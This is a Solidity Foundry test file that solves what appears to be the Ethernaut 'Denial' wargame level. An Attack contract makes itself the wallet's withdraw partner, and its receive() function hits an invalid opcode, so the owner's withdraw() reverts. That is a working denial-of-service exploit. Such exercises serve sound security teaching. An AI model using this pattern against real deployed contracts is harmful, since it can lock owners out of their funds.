// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Denial.sol";

/// @custom:win-condition 
// This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

// If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, 
// and the transaction is of 1M gas or less) you will win this level.


/// @custom:lesson-learned

contract Attack {

    function attack(Denial _denial) public {
       _denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
      console.log("here");
      assembly {
        invalid()
      }
    }

}


contract DenialSolvedTest is Test {

  Denial public s_denial;
  Attack public s_attack;
  address payable s_user;

  function setUp() public { 
    s_user = payable(vm.addr(1));
    s_denial = new Denial();
    s_attack = new Attack();
  }

  function testWinCondition() public {


    vm.prank(s_user);
    s_attack.attack(s_denial);

    vm.expectRevert();
    (bool success, ) = address(s_denial).call(abi.encodeWithSignature("withdraw()"));

    // s_denial.withdraw();
  }

 
}